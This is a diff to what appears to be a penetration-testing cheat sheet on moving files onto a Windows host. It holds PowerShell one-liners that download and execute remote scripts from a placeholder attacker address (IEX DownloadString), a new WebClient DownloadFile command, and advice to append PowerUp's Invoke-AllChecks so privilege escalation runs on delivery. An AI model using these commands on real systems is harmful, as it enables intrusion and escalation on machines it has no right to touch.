@@ -13,6 +13,8 @@ CertUtil can be used to download files from a web server using the following com
 
 ### Powershell
 
+#### Download and Execute Script
+
 Powershell can also be used to dowload and execute powershell scripts on a host:
 
 `powershell IEX(New-Object Net.WebClient).DownloadString('http://<IPAddress>:<Port>/PowershellScript.ps1')`
@@ -23,9 +25,17 @@ Powershell Download and Execute script with execution bypass and Powershell Vers
 
 To execute the payload upon delivery add the command you want Powershell to run at the end of the script.  A good example of this is using the PowerUp.ps1 privilege escalation script.  The command Invoke-AllChecks can be added to the end of the script so that it is ran as soon as it is collected from the attackers machine.  If you only want to download the script then execute later the `powershell Import-Module .\PowershellScript.ps1` command can be used.  This will then allow you to run the commands within the script manaully.
 
-In Powershell version 3 and above, wget can be used to download a file:
+#### Download File
+
+Using powershell to download a file:
+
+powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip_address>:<port>/<fileName.exe','<outputFilename.exe')"
+
+In Powershell version 3 and above, wget can also be used to download a file:
 
 `wget "http://<ip address>:<port>/FileToDownload.exe" -OutFile SomeOutputFileName.exe `
+
+
 
 ### BITS Admin
 
